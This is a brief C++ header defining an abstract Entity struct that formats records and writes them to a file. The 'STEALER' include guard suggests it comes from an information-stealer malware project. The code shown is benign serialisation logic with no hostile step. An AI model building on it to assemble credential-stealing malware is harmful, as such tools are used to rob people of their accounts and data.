//
// Created by .1qxz on 10.06.2024.
//

#ifndef STEALER_ENTITY_H
#define STEALER_ENTITY_H

#include "../../../../Includes.h"

struct Entity {
    virtual std::string toString() = 0;

    void write(std::stringstream &ss, bool newLine = true)
    {
        ss << toString();
        ss << "\n";

        if(newLine)
            ss << "\n";
    }

    static void writeSelf(const fs::path &dst, std::list<std::unique_ptr<Entity>> &entities, bool newLine = true, bool append = true) {
        std::stringstream ss;

        if(entities.empty())
            return;

        for (const auto& entity : entities)
            entity->write(ss, newLine);

        Utils::writeFile(dst, ss.str(), append);
    }
};

#endif //STEALER_ENTITY_H
